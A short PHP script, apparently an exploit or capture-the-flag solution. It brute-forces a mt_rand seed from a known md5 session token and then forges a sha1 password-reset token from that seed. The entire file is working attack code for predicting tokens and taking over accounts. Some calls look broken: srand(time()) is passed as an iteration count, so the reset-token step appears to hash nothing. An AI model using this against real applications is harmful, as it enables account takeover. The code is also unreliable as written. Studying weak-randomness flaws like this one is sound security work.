<?php

function getMaxInt() {
    return pow(2, 24);
}

function getMaxIteration() {
    $max = getMaxInt();
    mt_srand(time(), MT_RAND_PHP);
    $nb1 = mt_rand() % $max;
    $nb2 = mt_rand() % $max;
    return max($nb1, $nb2);
}

function generateRandomValues($seed, $iter) {
    mt_srand($seed, MT_RAND_PHP);
    $rand_values = array();
    for ($i = 0; $i < $iter; $i++) {
        $rand = mt_rand();
        if ($i >= $iter - 3) {
            array_push($rand_values, $rand); 
        }
    }
    return $rand_values;
}

function generateSessionToken($seed, $iter) {
    $rand_values = generateRandomValues($seed, 3);
    $concat = implode("", $rand_values);
    // echo $concat.PHP_EOL;
    return md5($concat);
}


function getSeed() {
    echo "Brute force seed..".PHP_EOL;
    $sess = '82cb317e94f5469f0815e48de213bef0';
    $seed_brute = 0;
    while (true) {
        // echo $seed_brute.PHP_EOL;
        if (generateSessionToken($seed_brute,srand(time())) === $sess) {
            echo "Done !".PHP_EOL;
            echo "Seed is ".$seed_brute.PHP_EOL;
            break;
        }
        $seed_brute +=1;
    }
    return $seed_brute;
}

// seed -> 10106592


function generatePasswordResetToken($seed, $iter) {
    $rand_values = generateRandomValues($seed, $iter);
    $concat = implode("", $rand_values);
    echo "Token: ".sha1($concat).PHP_EOL;
}


$seed = getSeed();
generatePasswordResetToken($seed,srand(time()));